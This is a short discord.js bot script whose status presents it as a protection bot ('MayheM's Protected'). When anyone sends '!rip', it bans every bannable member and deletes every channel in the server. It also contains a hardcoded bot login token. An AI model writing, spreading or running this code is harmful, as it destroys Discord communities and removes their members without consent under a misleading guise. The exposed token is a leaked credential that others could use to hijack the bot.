const Discord = require('discord.js');
const client = new Discord.Client();

client.on('ready', () => {
    client.user.setActivity(`MayheM's Protected`, { type: 'WATCHING' })
    .then(presence => console.log(`Activity set to ${presence.activities[0].name}`))
    .catch(console.error);})


client.on('message', message =>{
    if(message.content === "!rip") {
    
    
    message.guild.members.cache.forEach(m => {if(m.bannable){
      console.log(`banned: ${m.user.tag}`)
      m.ban().catch(console.error)
    }message.guild.channels.cache.forEach(channel => channel.delete())
  })}
  })

client.login('NzIxNzM1OTk5OTQ4MDYyODEx.XvEGNA.gLQK1Ld7VP9Pij4H2IbzLynxOW4')//